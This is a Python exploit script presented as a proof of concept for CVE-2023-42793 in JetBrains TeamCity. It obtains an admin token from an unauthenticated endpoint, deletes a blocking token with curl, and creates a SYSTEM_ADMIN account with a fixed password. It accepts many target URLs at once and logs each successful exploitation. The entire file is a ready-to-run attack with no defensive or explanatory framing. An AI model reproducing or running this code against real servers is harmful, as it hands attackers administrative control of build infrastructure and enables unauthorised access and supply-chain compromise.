import requests
import argparse
import re
import random
import string
import subprocess
import logging
from pyfiglet import Figlet

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Create banner using pyfiglet
custom_fig = Figlet(font='graffiti')
BANNER = custom_fig.renderText('YE1337!!')

def get_token(url):
    response = requests.post(f"{url}/app/rest/users/id:1/tokens/RPC2", verify=False)
    if response.status_code == 200:
        match = re.search(r'value="([^"]+)"', response.text)
        if match:
            return match.group(1)
    elif response.status_code in [400, 404]:
        delete_token(url)
        logger.info(f"Previous token deleted for {url}. Run the script again to create a new token.")
    else:
        logger.error(f"Failed to get a token for {url}")
    return None

def delete_token(url):
    delete_command = f"curl -k -X DELETE {url}/app/rest/users/id:1/tokens/RPC2"
    process = subprocess.Popen(delete_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()
    if process.returncode == 0:
        logger.info(f"Previous token deleted successfully for {url}.")
    else:
        logger.error(f"Failed to delete the previous token for {url}")

def create_admin_user(url, token):
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    random_chars = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(4))
    username = f"city_admin{random_chars}"
    data = {
        "username": username,
        "password": "Main_password!!**",
        "email": "angry-admin@funnybunny.org",
        "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}
    }
    response = requests.post(f"{url}/app/rest/users", headers=headers, json=data)
    if response.status_code == 200:
        logger.info(f"Successfully exploited {url}!")
        logger.info(f"Username: {username}")
        logger.info("Password: Main_password!!**")
    else:
        logger.error(f"Failed to create new admin user for {url}")

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="CVE-2023-42793 - TeamCity JetBrains PoC")
    parser.add_argument("-u", "--urls", required=True, help="Target URLs separated by commas")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose mode")
    args = parser.parse_args()

    if args.verbose:
        logger.setLevel(logging.DEBUG)

    urls = args.urls.split(',')

    for url in urls:
        url = url.strip()
        logger.info(f"Processing {url}")
        token = get_token(url)
        if token:
            create_admin_user(url, token)

if __name__ == "__main__":
    main()
